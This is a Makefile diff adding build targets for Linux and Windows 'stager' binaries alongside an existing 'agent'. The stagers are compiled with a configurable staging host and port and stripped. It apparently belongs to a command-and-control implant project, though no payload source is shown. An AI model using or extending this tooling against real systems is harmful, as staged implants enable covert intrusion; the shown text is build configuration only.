@@ -7,7 +7,10 @@ CFLAGS     ?= -O2 -s -Wall -Wextra
 LDFLAGS_LINUX = -lpthread
 LDFLAGS_WIN   = -lws2_32
 
-.PHONY: all linux windows clean
+.PHONY: all linux windows stager-linux stager-windows clean
+
+STAGE_HOST ?= 127.0.0.1
+STAGE_PORT ?= 8080
 
 all: agent_linux agent.exe
 
@@ -21,8 +24,18 @@ agent.exe: agent.c
 	strip agent.exe 2>/dev/null || true
 	@echo "[+] Windows agent built: agent.exe ($$(wc -c < agent.exe) bytes)"
 
+stager-linux: stager.c
+	$(CC_LINUX) $(CFLAGS) -o stager_linux stager.c -DSTAGE_HOST='"$(STAGE_HOST)"' -DSTAGE_PORT=$(STAGE_PORT) -lpthread
+	strip stager_linux
+	@echo "[+] Linux stager built: stager_linux ($$(wc -c < stager_linux) bytes) [→ $(STAGE_HOST):$(STAGE_PORT)]"
+
+stager-windows: stager.c
+	$(CC_WIN) $(CFLAGS) -o stager.exe stager.c -DSTAGE_HOST='"$(STAGE_HOST)"' -DSTAGE_PORT=$(STAGE_PORT) -lws2_32
+	strip stager.exe 2>/dev/null || true
+	@echo "[+] Windows stager built: stager.exe ($$(wc -c < stager.exe) bytes) [→ $(STAGE_HOST):$(STAGE_PORT)]"
+
 linux: agent_linux
 windows: agent.exe
 
 clean:
-	rm -f agent_linux agent.exe
+	rm -f agent_linux agent.exe stager_linux stager.exe
